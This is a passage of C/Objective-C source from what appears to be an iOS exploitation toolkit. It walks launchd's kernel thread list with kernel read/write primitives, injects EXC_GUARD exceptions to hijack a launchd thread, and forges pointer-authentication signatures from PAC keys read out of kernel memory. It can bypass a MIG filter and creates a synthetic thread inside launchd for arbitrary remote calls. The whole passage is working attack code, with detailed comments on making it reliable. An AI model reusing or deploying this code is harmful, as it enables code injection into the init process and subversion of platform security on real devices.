            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Round 24: same abort when the lifecycle gate closes mid-walk — every
        // further arm is refused deterministically, so continuing the walk can
        // only burn time and retry-storm. Un-arm whatever this attempt armed.
        if (excport_gate_blocked()) {
            printf("[RC] init: lifecycle gate closed mid-walk (%d armed, %d "
                   "candidate(s)) — un-arming and aborting hijack (fail fast)\n",
                   successThreadCount, validThreadCount);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureLifecycleGated, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Round 30: hard overall init budget — abort mid-walk with the same
        // symmetric cleanup as a stop request.
        if (clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW) - initStartNs > kInitHardBudgetNs) {
            printf("[RC] init: HARD BUDGET (8 s) exceeded mid-walk (%d armed, %d "
                   "candidate(s)) — un-arming and aborting hijack\n",
                   successThreadCount, validThreadCount);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Round 16: gate each NEW candidate's FIRST dereference. Launchd
        // threads die mid-walk (the log's "Set exception port failed" and
        // "link NULL after N links" lines), and a kread of a freed thread on
        // a trimmed zone page is the copy_validate synchronous-fault class —
        // krw_set_nonfatal cannot intercept a kernel data abort.
        // rc_validate_target_thread guards only the pre-arm WRITE; the walk's
        // own task/link reads were ungated beyond the VA-range check. The
        // ksafe map is a boot-time snapshot, so this catches never-committed
        // windows only; the freed-after-snapshot residual is a µs-scale
        // zone-GC race, accepted and documented in the round-16 report.
        if (ksafe_available() &&
            !kaddr_is_mapped(currThread, MAX(off_thread_t_tro,
                                             off_thread_task_threads_next) + 8)) {
            printf("[RC] walk: candidate %#llx outside the ksafe map "
                   "(never-committed window) — ending walk, no deref\n",
                   currThread);
            break;
        }
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("[%s:%d] failed on getting first thread at all, resetting\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                break;
            }
        }

        if (task == g_RC_taskAddr) {
            // Round 10: never arm our OWN leftover synthetic call thread (a
            // previous session's trojan thread, parked in-kernel waiting for
            // our exception reply). Its AST_GUARD can never fire there, so
            // arming it converts the warm-up into a guaranteed full-length
            // trap-wait stall — the suspected 17:45:56 shape (injected=1,
            // trap never arrived).
            if (rc_synthetic_is_known(currThread)) {
                rc_note_walk_skip("own synthetic call thread — parked in trojan "
                                  "RPC, AST can never fire", &walkSkips);
            // Round 20: never arm a thread ANOTHER LIVE SESSION armed or
            // hijacked. Arming retargets its exception port to ours — the
            // other session's protocol traps and restores then starve while
            // we consume its parked thread's re-traps as our own (071602:
            // both inits hijacked trojan 0xffffffe0222ef8e8; the loser's
            // calls timed out for 40 s and the winner restored the thread TO
            // a stolen park state). With the init mutex this is unreachable;
            // it is the belt-and-braces for any future call-site bug.
            } else if (rc_livearm_owned_by_other(currThread)) {
                rc_note_walk_skip("owned by ANOTHER live session — arming it "
                                  "would retarget its exception port and "
                                  "sabotage that session", &walkSkips);
            // Round 13: skip threads armed by a previous attempt of this init
            // — they never trapped (blocked in-kernel), so re-arming them just
            // burns another capped wait. Pick a different candidate.
            // Round 18: the boot-scoped blacklist extends the same skip across
            // warm-ups within this boot (persisted, boot-stamped).
            } else if (rc_thread_tried_this_init(triedThreads, triedCount, currThread) ||
                       rc_tried_blacklist_contains(currThread)) {
                rc_note_walk_skip("armed in a previous attempt — never trapped",
                                  &walkSkips);
            // Round 8: RE-VALIDATE immediately before any write to the thread
            // object. The loop-top task check passed, but launchd threads die
            // constantly — arming a freed slot writes into the threads zone
            // (panic-full-2026-09-29-215904). Skip silently-ish, write nothing.
            } else if (!rc_validate_target_thread(currThread, g_RC_taskAddr)) {
                rc_note_walk_skip("pre-arm re-validation", &walkSkips);
            // Round 30: re-check stop/gate IMMEDIATELY before the arm trap —
            // the validation above spans KRW reads during which a backgrounding
            // can land (184716: backgrounded 14 ms after the first arm, init
            // entered the next arm's trap family and deadlocked rbd). Arming
            // after a stop leaves a live EXC_GUARD + port retarget with nobody
            // answering. Break: the stop requester already disarmed the armed
            // snapshot synchronously; the trap-wait/attempt-top checks finish
            // the abort with the symmetric cleanup.
            } else if (remote_call_stop_requested() || excport_gate_blocked()) {
                printf("[RC] walk: stop/gate landed during candidate validation "
                       "— refusing to arm %#llx; aborting walk\n", currThread);
                break;
            } else if (!set_exception_port_on_thread(g_RC_firstExceptionPort, currThread, useMigFilterBypass)) {
                printf("[%s:%d] Set exception port on thread:0x%llx failed\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                if (!validThreadCount) {
                    printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                    firstThread = retry_first_thread(useMigFilterBypass);
                    currThread = firstThread;
                    retryCount++;
                    continue;
                }
                validThreadCount++;
            } else {
                // Inject a EXC_GUARD exception on this thread
                if (!inject_guard_exception(currThread, guardCode)) {
                    printf("[%s:%d] Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                    if (!validThreadCount) {
                        printf("[%s:%d] failed on first thread, resetting first thread and currThread\n", __FUNCTION__, __LINE__);
                        firstThread = retry_first_thread(useMigFilterBypass);
                        currThread = firstThread;
                        retryCount++;
                        continue;
                    }
                } else {
                    if (!g_RC_trojanThreadAddr)
                        g_RC_trojanThreadAddr = currThread;
                    successThreadCount++;
                    [g_RC_threadList addObject:@(currThread)];
                    rc_armed_snapshot_add(currThread);
                    rc_livearm_register(currThread);   // round 20: other sessions must not arm it
                    // Round 10: post-mortem identity of every armed thread —
                    // if the device dies while one is armed (17:45:56 shape),
                    // the analysis needs to know WHICH thread it was, not just
                    // how many.
                    printf("[RC] walk: ARMED thread %#llx (candidate #%d, armed #%d)\n",
                           currThread, validThreadCount + 1, successThreadCount);
                    RC_DEBUG("[%s:%d] Inject EXC_GUARD on thread:0x%llx OK\n", __FUNCTION__, __LINE__, (unsigned long long)currThread);
                }
                validThreadCount++;
            }
            if (successThreadCount >= targetInjectedThreadCount) {
                break;
            }
        } else if (task && !validThreadCount) {
            printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
            firstThread = retry_first_thread(useMigFilterBypass);
            currThread = firstThread;
            retryCount++;
            continue;
        }

        uint64_t next = kread64(currThread + off_thread_task_threads_next);
        walkedLinks++;
        if (!next || !is_kaddr_valid(next)) {
            if (!validThreadCount && !walkSkips) {
                printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
                firstThread = retry_first_thread(useMigFilterBypass);
                currThread = firstThread;
                retryCount++;
                continue;
            } else {
                // Round 8: say WHICH break this is. A NULL link is the genuine
                // list terminator; a nonzero-but-invalid link is corruption.
                // Verdict heuristic: launchd owns dozens of threads, so a list
                // ending after only a handful of links is a stale/corrupt
                // chain, not end-of-list.
                printf("[RC] walk: thread-list link %s after %d link(s) "
                       "(candidates=%d armed=%d skips=%d) — %s\n",
                       next ? "INVALID (corrupt)" : "NULL",
                       walkedLinks, validThreadCount, successThreadCount, walkSkips,
                       (next && !is_kaddr_valid(next)) || walkedLinks < 8
                           ? "STALE/CORRUPT link — launchd has far more threads"
                           : "likely end-of-list");
                break;
            }
        }
        // Round 26: cycle detection. A NULL/invalid link is handled above; a
        // VALID link that points back at an already-processed thread means the
        // list lassoed itself mid-walk (churn re-linked a freed slot). Break
        // with the stale/corrupt verdict — following it would re-arm the same
        // threads and eat the rest of the 64-link budget on duplicates.
        bool linkCycles = false;
        for (int wi = 0; wi < walkedThreadCount; wi++) {
            if (walkedThreads[wi] == next) { linkCycles = true; break; }
        }
        if (linkCycles) {
            printf("[RC] walk: thread-list CYCLE after %d link(s) (revisit "
                   "%#llx, candidates=%d armed=%d skips=%d) — list mutated "
                   "mid-walk; ending walk\n",
                   walkedLinks, next, validThreadCount, successThreadCount,
                   walkSkips);
            break;
        }
        if (walkedThreadCount < (int)(sizeof(walkedThreads)/sizeof(walkedThreads[0])))
            walkedThreads[walkedThreadCount++] = currThread;
        // Round 17: the round-16 proximity gate that used to live here was
        // REMOVED. It ended walks on legitimate links — on this kernel the
        // threads zone spans far more than the 16 MB window (live 20.log
        // 12:28:39: a real link 0x25bc000 (~37 MB) away; only 1 of 6 target
        // threads got armed, warm-up stalled). Safety now rests on the
        // loop-top ksafe-mapped gate, which checks REAL committed-ness of the
        // next candidate before any dereference instead of guessing by
        // distance.
        currThread = next;
    }

    if(useMigFilterBypass)
        mig_bypass_pause();

    RC_DEBUG("[%s:%d] Valid threads: %d\n", __FUNCTION__, __LINE__, validThreadCount);
    RC_DEBUG("[%s:%d] Injected threads: %d\n", __FUNCTION__, __LINE__, successThreadCount);
    if (walkSkips)
        printf("[RC] walk summary: %d dead/freed slot(s) skipped with no writes "
               "(candidate validation working)\n", walkSkips);

    if (g_RC_threadList.count == 0) {
        // Nothing armed this attempt — waiting cannot produce a trap. Churn
        // may offer new candidates on the next walk; fail only after the last
        // attempt.
        printf("[RC] init: arm attempt %d/%d injected 0 threads — %s\n",
               armAttempt, kMaxArmAttempts,
               armAttempt < kMaxArmAttempts ? "retrying with a fresh walk"
                                            : "no armable threads left");
        if (armAttempt == kMaxArmAttempts) {
            printf("[%s:%d] Exception injection failed. Aborting.\n", __FUNCTION__, __LINE__);
            remote_call_note_init_failure(RemoteCallInitFailureNoTargetThreads, targetPid);
            abandon_remote_call();
            return -1;
        }
        continue;
    }
    printf("[RemoteCall] EXC_GUARD injected on %lu thread(s) — waiting for trap "
           "(attempt %d/%d).\n",
           (unsigned long)g_RC_threadList.count, armAttempt, kMaxArmAttempts);

    // Round 10 heartbeat slicing (each tick proves the APP was alive — the
    // H1/H2 post-mortem discriminator — and polls the stop flag), with the
    // round-13 budget: at most kAttemptWaitCapMS per attempt, never past the
    // caller's total firstExceptionTimeoutMS. 1 s slices under short waits
    // keep the ticks dense; long waits keep the 5 s cadence.
    int attemptWaitMS = firstExceptionTimeoutMS - totalWaitedMS;
    if (attemptWaitMS > kAttemptWaitCapMS) attemptWaitMS = kAttemptWaitCapMS;
    // Round 30: the hard init budget also caps this attempt's wait.
    uint64_t initElapsedNs = clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW) - initStartNs;
    int64_t budgetLeftMS = 0;
    if (initElapsedNs < kInitHardBudgetNs)
        budgetLeftMS = (int64_t)(kInitHardBudgetNs - initElapsedNs) / 1000000LL;
    if (budgetLeftMS <= 0) budgetLeftMS = 1;   // in-loop check below aborts on first slice
    if (attemptWaitMS > budgetLeftMS) attemptWaitMS = (int)budgetLeftMS;
    const int kTrapWaitSliceMS = (attemptWaitMS <= 5000) ? 1000 : 5000;
    int waitedMS = 0;
    while (waitedMS < attemptWaitMS) {
        int slice = attemptWaitMS - waitedMS;
        if (slice > kTrapWaitSliceMS) slice = kTrapWaitSliceMS;
        if (wait_exception(firstExceptionPort, &exc, slice, false)) {
            gotFirstTrap = true;
            break;
        }
        waitedMS += slice;
        totalWaitedMS += slice;
        if (remote_call_stop_requested()) {
            printf("[RC] init: stop requested during trap-wait at %d/%d ms — "
                   "un-arming %lu thread(s) and aborting hijack\n",
                   totalWaitedMS, firstExceptionTimeoutMS,
                   (unsigned long)g_RC_threadList.count);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
            // A thread may have trapped just before the abort — release it
            // with its own state; never leave a launchd thread parked in our
            // exception port while we tear down.
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Round 24: gate closed during the trap-wait — the trap can still
        // arrive (the AST is armed), but every subsequent sign would be
        // refused; abort now with the same symmetric cleanup instead of
        // waiting out the cap and fumbling the hijack behind a closed gate.
        if (excport_gate_blocked()) {
            printf("[RC] init: lifecycle gate closed during trap-wait at %d/%d "
                   "ms — un-arming %lu thread(s) and aborting hijack (fail "
                   "fast)\n",
                   totalWaitedMS, firstExceptionTimeoutMS,
                   (unsigned long)g_RC_threadList.count);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureLifecycleGated, targetPid);
            abandon_remote_call();
            return -1;
        }
        // Round 30: hard budget hit during the trap-wait — same cleanup.
        if (clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW) - initStartNs > kInitHardBudgetNs) {
            printf("[RC] init: HARD BUDGET (8 s) exceeded during trap-wait at "
                   "%d/%d ms — un-arming %lu thread(s) and aborting hijack\n",
                   totalWaitedMS, firstExceptionTimeoutMS,
                   (unsigned long)g_RC_threadList.count);
            for (NSNumber *thread in g_RC_threadList) {
                clear_guard_exception(thread.unsignedLongLongValue);
                rc_livearm_unregister(thread.unsignedLongLongValue);
            }
            rc_armed_snapshot_forget();
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
            remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
            abandon_remote_call();
            return -1;
        }
        printf("[RC] trap-wait heartbeat: %d/%d ms (attempt %d/%d), no trap yet "
               "(injected=%lu) — app alive\n",
               totalWaitedMS, firstExceptionTimeoutMS, armAttempt, kMaxArmAttempts,
               (unsigned long)g_RC_threadList.count);
    }
    if (gotFirstTrap) break;

    // Attempt timed out with no trap: un-arm everything this attempt armed
    // (these threads are PROVEN non-trapping — remember them so the next walk
    // picks DIFFERENT candidates), drain any trap that raced the timeout, and
    // either retry with a fresh walk or surface the failure.
    printf("[RC] init: attempt %d/%d — no trap within %d ms (injected=%lu); "
           "un-arming, %s\n",
           armAttempt, kMaxArmAttempts, waitedMS,
           (unsigned long)g_RC_threadList.count,
           armAttempt < kMaxArmAttempts ? "retrying with a fresh walk" : "giving up");
    for (NSNumber *thread in g_RC_threadList) {
        uint64_t tried = thread.unsignedLongLongValue;
        clear_guard_exception(tried);
        rc_livearm_unregister(tried);
        if (triedCount < (int)(sizeof(triedThreads) / sizeof(triedThreads[0])))
            triedThreads[triedCount++] = tried;
        rc_tried_blacklist_add(tried);   // round 18: remember across warm-ups this boot
    }
    rc_armed_snapshot_forget();
    // A thread may have trapped just as the wait timed out — its message is
    // already queued. Release it with its own state; never leave a launchd
    // thread parked in our exception port.
    rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
    if (armAttempt == kMaxArmAttempts) {
        printf("[%s:%d] Failed to receive first exception within %dms (%d attempts)\n",
               __FUNCTION__, __LINE__, totalWaitedMS, kMaxArmAttempts);
        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
        abandon_remote_call();
        return -1;
    }
    }   // round 13: end of the arm-attempt loop

    if (!gotFirstTrap) {
        // Unreachable by construction (every non-trapping path returns inside
        // the loop) — never fall into the hijack path without a trapped thread.
        remote_call_note_init_failure(RemoteCallInitFailureFirstExceptionTimeout, targetPid);
        abandon_remote_call();
        return -1;
    }

    // Round 20 (C-i): the first trap MUST NOT itself be a sentinel park trap.
    // When two inits raced (071602), the second init consumed the FIRST
    // session's trojan re-trap (pc=0x201) as ITS "first trap" — the thread was
    // already a parked protocol thread of another session. Everything derived
    // from it is poison: g_RC_originalState would be the park state, and the
    // end-of-init "restore" would re-park the thread at the sentinel forever
    // (exactly what the 07:14:21 restore did). Unreachable behind the init
    // mutex; if it ever fires, refuse the hijack — never save a sentinel as a
    // thread's original state.
    if (rc_exc_is_park_trap(&exc)) {
        printf("[RC] init: FIRST TRAP IS A SENTINEL PARK TRAP (pc=%#llx "
               "code=%#llx/%#llx) — the trapped thread is ANOTHER session's "
               "parked protocol thread, not a fresh hijack victim. Refusing "
               "the hijack (071602 watchdog chain); the thread keeps its own "
               "state and stays parked for its owner's teardown.\n",
               (unsigned long long)exc.threadState.__pc,
               (unsigned long long)exc.codeFirst,
               (unsigned long long)exc.codeSecond);
        reply_with_state(&exc, &exc.threadState);   // one reply per message; it re-parks
        for (NSNumber *thread in g_RC_threadList) {
            clear_guard_exception(thread.unsignedLongLongValue);
            rc_livearm_unregister(thread.unsignedLongLongValue);
        }
        rc_armed_snapshot_forget();
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 0, NULL, process);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    uint64_t trapMs = (clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW) - tInjectStartNs) / 1000000ULL;
    g_RC_lastInitInjected = successThreadCount;
    g_RC_lastInitTrapMs = trapMs;
    printf("[RemoteCall] first trap after %llu ms (injected=%d of target %d) — "
           "hijacking execution inside %s.\n",
           (unsigned long long)trapMs, successThreadCount, targetInjectedThreadCount,
           process);
    memcpy(&g_RC_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));

    // Round 20 (B): clearing guards only ever touches threads THIS session
    // armed (g_RC_threadList is per-session), and with the init mutex no
    // other session can share them. The trojan stays live-arm REGISTERED for
    // the session's whole life (in fallback mode it cycles temp calls on the
    // first port — a later init arming it is the 071602 sabotage); everyone
    // else is released.
    for (NSNumber *thread in g_RC_threadList) {
        uint64_t cleared = thread.unsignedLongLongValue;
        clear_guard_exception(cleared);
        if (cleared != g_RC_trojanThreadAddr)
            rc_livearm_unregister(cleared);
    }
    rc_armed_snapshot_forget();   // guards are down — the armed window is over
    RC_DEBUG("[%s:%d] Finish clearing EXC_GUARD from all other threads...\n", __FUNCTION__, __LINE__);

    ExceptionMessage exc2;
    // Round 7: was 1500 ms. With 6 injected threads the late ones would stretch
    // this drain and eat the warm-up win; the first-port responder now services
    // late traps for the session's whole life, so the init drain only catches
    // the near-simultaneous ones.
    int desiredTimeout = 350;
    while (wait_exception(firstExceptionPort, &exc2, desiredTimeout, false)) {
        reply_with_state(&exc2, &exc2.threadState);
    }

    // Round 10: a stop that raced the first trap lands here — guards are
    // already cleared and strays drained above, so all that remains is putting
    // the trapped thread back with its original state (trapStage 1 replies the
    // pending message) and dropping the session.
    if (remote_call_stop_requested()) {
        printf("[RC] init: stop requested right after first trap — restoring "
               "trapped thread, aborting hijack\n");
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 1, &exc, process);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    // Round 30: hard budget right after the first trap — the sign/dispatch
    // phase ahead runs exception-port ops that must not start past the budget.
    if (clock_gettime_nsec_np(CLOCK_MONOTONIC_RAW) - initStartNs > kInitHardBudgetNs) {
        printf("[RC] init: HARD BUDGET (8 s) exceeded right after first trap — "
               "restoring trapped thread, aborting hijack\n");
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 1, &exc, process);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }

    if (!g_RC_trojanThreadAddr)
        g_RC_trojanThreadAddr = firstThread;

    // Round 17: cache the session's PAC signing keys NOW — the trojan thread is
    // parked in our exception port at this exact moment, so it is provably
    // alive and the read cannot zero-fill. Once we reply below it returns to
    // launchd duty and may exit at any time; the 12:31:23 panic was per-call
    // key re-reads hitting that dead thread. Userspace PAC keys are per-task
    // (copied into each thread at creation), so one capture serves every sign
    // for the target task's lifetime. On failure the session continues with
    // the legacy per-call re-read (and its zero-key refusal).
    {
        krw_set_nonfatal(true);
        uint64_t kA = thread_get_rop_pid(g_RC_trojanThreadAddr);
        uint64_t kB = thread_get_jop_pid(g_RC_trojanThreadAddr);
        krw_set_nonfatal(false);
        if (kA || kB) {
            g_RC_pacKeyA = kA;
            g_RC_pacKeyB = kB;
            g_RC_pacKeysCached = true;
            printf("[RC] session PAC keys cached from trojan thread %#llx — "
                   "per-call re-reads of a mortal thread eliminated\n",
                   g_RC_trojanThreadAddr);
        } else {
            printf("[RC] WARN: session PAC key capture read zero — falling back "
                   "to per-call key reads (zero-key refusal still applies)\n");
        }
    }

    arm_thread_state64_internal newState = exc.threadState;
    if (!sign_state(g_RC_trojanThreadAddr, &newState, FAKE_PC_TROJAN_CREATOR, FAKE_LR_TROJAN_CREATOR)) {
        // PAC sign of the trojan-creator redirect failed (KRW lost mid-hijack).
        // The trapped thread has NOT been replied yet — hand it back its
        // original state (clean restore, pure Mach IPC) and abort.
        printf("[RC] init: redirect sign failed — restoring trapped thread, aborting hijack\n");
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 1, &exc, process);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        abandon_remote_call();
        return -1;
    }
    reply_with_state(&exc, &newState);

    if (g_RC_originalThreadOnly) {
        g_RC_creatingExtraThread = false;
        g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
        g_RC_pid = (int)targetPid;
        g_RC_success = true;
        RC_DEBUG("[%s:%d] Original-thread-only RemoteCall ready; skipping synthetic pthread\n",
             __FUNCTION__, __LINE__);
        rc_start_firstport_responder(firstExceptionPort);
        return 0;
    }

    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x100ULL;
    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
    g_RC_success = true;

    uint64_t remoteCrashSigned = remote_pac(g_RC_trojanThreadAddr, FAKE_PC_TROJAN, 0);
    if (remoteCrashSigned == (uint64_t)-1) {
        // PAC sign of the synthetic thread's start address failed (KRW lost).
        // Passing -1 as the pthread start routine would crash the synthetic
        // thread INSIDE launchd on resume. Restore the original thread (it's
        // in the trojan loop now) and abort.
        printf("[RC] init: remote_pac(FAKE_PC_TROJAN) failed — restoring trapped "
               "thread, aborting hijack\n");
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }
    uint64_t bootstrapPid = do_remote_call_temp(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0); // for testing
    if (!g_RC_success || bootstrapPid == 0) {
        printf("[%s:%d] bootstrap getpid failed before synthetic thread creation\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }

    // Round 24 (142628): the gate can close mid-hijack — in the incident the
    // phone locked between the first trap and this point, every remaining
    // remote_pac sign was refused, the synthetic thread got created but could
    // not be resumed/dispatched, and the failure-path teardown then ran
    // UNSIGNED. If the gate is closed NOW, refuse to create a thread we could
    // not dispatch to: restore the trapped thread and abort cleanly (the
    // teardown bypass inside abandon keeps the restore signed).
    if (excport_gate_blocked()) {
        printf("[RC] init: lifecycle gate closed mid-hijack (after first trap, "
               "before synthetic-thread creation) — restoring trapped thread "
               "and aborting; refusing to create a thread we cannot dispatch "
               "to\n");
        remote_call_note_init_failure(RemoteCallInitFailureLifecycleGated, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }

    uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np", trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
    if (!g_RC_success || createResult != 0) {
        printf("[%s:%d] pthread_create_suspended_np remote call failed result=%llu\n",
               __FUNCTION__, __LINE__, createResult);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }

    RC_DEBUG("[%s:%d] trojanMemTemp: 0x%llx\n", __FUNCTION__, __LINE__, trojanMemTemp);
    uint64_t pthreadAddr    = remote_read64(trojanMemTemp);
    RC_DEBUG("[%s:%d] pthreadAddr: 0x%llx\n", __FUNCTION__, __LINE__, pthreadAddr);
    if (!pthreadAddr) {
        printf("[%s:%d] pthread_create_suspended_np did not write a pthread pointer\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }
    uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
    RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
    if (!g_RC_success || !callThreadPort) {
        printf("[%s:%d] pthread_mach_thread_np remote call failed\n",
               __FUNCTION__, __LINE__);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }
    g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
    g_RC_callThreadPort = callThreadPort;   // round 24: orphan-terminate channel
    if (!is_kaddr_valid(g_RC_callThreadAddr)) {
        printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
               __FUNCTION__, __LINE__, callThreadPort, g_RC_callThreadAddr);
        remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
        rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
        abandon_remote_call();
        return -1;
    }
    // Round 10: from here on the synthetic thread exists inside the target —
    // register it so no later walk (this session's retries, a future session's
    // hijack) ever arms a thread whose AST can never fire.
    rc_synthetic_register(g_RC_callThreadAddr);

    if(useMigFilterBypass)
        mig_bypass_resume();

    if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
        printf("[%s:%d] Failed set exc port on new thread, retrying...\n", __FUNCTION__, __LINE__);
        pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
        g_RC_dummyThreadMach = pthread_mach_thread_np(dummyThread);
        g_RC_dummyThreadAddr = task_get_ipc_port_kobject(selfTask, g_RC_dummyThreadMach);
        g_RC_dummyThreadTro  = kread64(g_RC_dummyThreadAddr + off_thread_t_tro);
        sleep(1);
        if (!set_exception_port_on_thread(secondExceptionPort, g_RC_callThreadAddr, useMigFilterBypass)) {
            if(useMigFilterBypass)
                mig_bypass_pause();
            // The original thread is running the trojan loop and the synthetic
            // thread was never resumed — destroy_remote_call() would strand the
            // original (its pthread_exit goes to a thread that can't run).
            // Restore the original thread first (Mach IPC only), then drop state.
            rc_restore_trapped_thread_for_abort(firstExceptionPort, 2, NULL, process);
            abandon_remote_call();
            return -1;
        }
    }

    if(useMigFilterBypass)
        mig_bypass_pause();

    RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);

    uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
    // Round 19: also check g_RC_success — round-18 stray/crash classification
    // fails the call by returning 0 with g_RC_success=false, and 0 is
    // thread_resume's KERN_SUCCESS. A failed resume must NOT read as success:
    // the fallback (originalThreadOnly-style) keeps the trojan cycling through
    // temp calls and restores it at teardown; a leaked never-resumed synthetic
    // thread is inert (created suspended, holds no launchd locks) — and if the
    // dispatch actually ran despite the failed accounting, the teardown drain
    // exits that thread from its second-port park trap.
    if (ret != 0 || !g_RC_success) {
        printf("[%s:%d] Couldn't resume new thread (ret=%llu success=%d), falling "
               "back to original\n", __FUNCTION__, __LINE__,
               (unsigned long long)ret, g_RC_success ? 1 : 0);
        g_RC_creatingExtraThread = false;
    }

    if (g_RC_creatingExtraThread) {
        RC_DEBUG("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
        // Round 19: NEVER run a session with the trojan restore unconfirmed.
        // A silently failed restore leaves the original launchd thread parked
        // at a protocol sentinel for the session's whole life — the pre-19
        // responder then ping-ponged its queued trap 35,349 times in 347 ms
        // (19:58:34), and when teardown destroyed the port mid-loop the
        // thread's final fault was undeliverable: launchd took SIGBUS and the
        // device panicked "initproc exited" 19 s later (19:58:53). Tear the
        // session down symmetrically instead — the drain restores the parked
        // trojan with its original state and exits the synthetic thread.
        if (!restore_trojan_thread(&g_RC_originalState)) {
            printf("[RC] init: trojan restore FAILED — original thread still "
                   "parked; tearing the session down (teardown drain restores "
                   "it) and failing the init\n");
            remote_call_note_init_failure(RemoteCallInitFailureOther, targetPid);
            destroy_remote_call_internal();
            return -1;
        }
    }
    RC_DEBUG("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);

    g_RC_pid = (int)do_remote_call_stable(100, "getpid", 0, 0, 0, 0, 0, 0, 0, 0);
    printf("[RemoteCall] Synthetic call thread live inside %s (pid=%d)%s\n",
           process, g_RC_pid,
           (g_RC_pid != (int)targetPid)
